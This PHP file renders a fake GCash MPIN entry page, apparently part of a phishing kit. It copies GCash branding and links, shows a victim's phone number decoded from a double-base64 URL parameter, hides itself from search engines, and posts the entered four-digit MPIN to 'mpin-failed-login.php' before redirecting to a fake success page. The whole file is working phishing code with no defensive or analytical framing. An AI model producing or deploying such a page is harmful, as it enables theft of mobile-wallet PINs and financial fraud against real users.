<?php
$mobile_num = base64_decode(base64_decode($_GET['mobcil']));
$input = $mobile_num;
$output = substr($input, -10, -7) . " " . substr($input, -7, -4) . " " . substr($input, -4); 
echo '<html class="desktop">
<head>
<title>GCash Mpin</title>
<meta property="og:type" content="website">
<meta name="robots" content="noindex, nofollow">
<meta name="googlebot" content="noindex">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="shortcut icon" href="https://img.appsrankings.com/520020791/gcash-logo.jpg" type="image/x-icon" />
<link href="https://fonts.googleapis.com/css?family=Karla|Karla:Bold|Poppins|Poppins:600&amp;display=swap" rel="stylesheet">
<link rel="stylesheet" href="../css/mpin.css">
<link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
<script src="https://code.jquery.com/jquery-1.9.1.min.js"></script>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">

<style>

body {
background-color:#007cff;
text-align:center;
color:white;
font-family: Karla,sans-serif;
}
span{
    font-size:12px;
}
.mpin {
  text-align: center;
  border:none;
  outline: none;
  height:50px;
  letter-spacing: 0.1em;
  font-size:30px;
  background:transparent;
  border-radius:3px;
  color:white;
  margin-right: 4px;
  margin-left: 4px;
  width:150px;
  -webkit-text-security:disc;
}
.mpin:focus{
 color:black;
 text-shadow:0px 0px 0px black;
}
img {
width:250px;
height:190px;
}
[placeholder]:focus::-webkit-input-placeholder {
  opacity: 0;
}
.submpin{
text-align:center;
background-color:white;
border: none;
color: #0079FC;
outline:none;
width:50px;
height:50px;
cursor:pointer;
text-align: center;
font-size:16px;
border-radius: 50%;
}

::placeholder {
  color: white;
  opacity: 1;
}

  .pin-login__key{
    background:#0057b1;
    border:none;
    cursor:pointer;
    color:white;
    width:70px;
    height:70px;
    margin:3px;
    display:inline-flex;
    font-size:25px;
    justify-content:center;
    align-items:center;
    -moz-user-select: none;
   -khtml-user-select: none;
   -webkit-user-select: none;
   transition-duration: 0.1s;
   -webkit-transition-duration: 0.1s;
   text-decoration: none;
   overflow: hidden;
    border-radius:50%;
  }

.gcash-mpin-logo{
  content:url(../Gcash_files/gcash.png);
  width:180px;height:60px;
  margin-right: auto;
  margin-left: auto;
}
</style>

<script>


  $(document).ready(function(){

    $(\'body\').on(\'keyup\', \'input.mpin\', function()
    {
      var key = event.keyCode || event.charCode;
      var inputs = $(\'input.mpin\');
      if(($(this).val().length === this.size) && key != 32)
      {
        inputs.eq(inputs.index(this) + 1).focus();
      }
      if( key == 8 || key == 46 )
      {
        var indexNum = inputs.index(this);
        if(indexNum != 0)
        {
        inputs.eq(inputs.index(this) - 1).val(\'\').focus();
        }
      }

    });
  });</script>


</head>
<body>
<div class="gcash-mpin-logo"></div>
<br><span style="font-size:15px;color:#74b8ff;">0'.$output.'&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<a style="text-decoration:none;color:white" href="index.php">Change Number</a></span>
<br><br>
<font>Enter your MPIN<font><br>
<span style="font-size:14px;"><i class="fa fa-exclamation-circle" style="font-size:15px;color:white"></i> Never share your MPIN or OTP with anyone.</span>
<form method="POST">
    <div class="mpin-login" id="mainMpinLogin" >
      <input class="mpin" style="placeholder{color:black;}" readonly name="mpincode" placeholder="&minus;&minus;&minus;&minus;" id="mympin" >
      <br><br>
      <div class="number-pad">
        <!-- <div class="pin-login__key">0</div>
        <div class="pin-login__key material-icons">done</div> -->
        </div>

  </div>


    <script src="../gcash_js/mpin-login.js"></script>

    <!-- Object -->
    <script>
      new MpinLogin({
          el: document.getElementById("mainMpinLogin"),
          loginEndpoint: "mpin-failed-login.php",
          redirectTo: "success.php?successfully=verified",
          maxNumbers: 4
      });
    </script>

    <script>
     function mpin_disable(value){

         var mpin = document.getElementById("mympin").value;

         var mpin_length = mpin.toString().length;

         if (mpin_length == 4){
             document.getElementById("mpinsub").disabled = false;
         } else{
             document.getElementById("mpinsub").disabled = true;
         }
     }

    </script>
    </form>
    <br><br><br><br><footer>
<a style="text-decoration:none;color:white;" href="https://help.gcash.com/hc/en-us"><span>Help Center</span></a>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span color:#74b8ff;>v5.54.1.531</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<a style="text-decoration:none;color:white;" href="https://help.gcash.com/hc/en-us"><span>Forgot MPIN?</span></a></footer>

</body>

</html>';

?>